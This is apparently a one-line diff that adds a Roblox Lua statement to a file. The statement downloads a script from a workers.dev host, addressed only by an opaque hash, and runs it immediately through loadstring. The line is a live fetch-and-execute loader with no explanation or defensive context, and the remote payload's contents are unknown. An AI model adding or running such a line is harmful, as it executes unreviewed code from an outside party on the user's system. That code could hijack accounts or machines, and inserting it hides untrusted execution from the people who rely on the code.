@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://lua-script-hosting-api.phantomflux.workers.dev/api/boot/cd33be67d955452bc188283cd631cf4bdd9c9518df53b102f234813fe5d4e6dc"))()
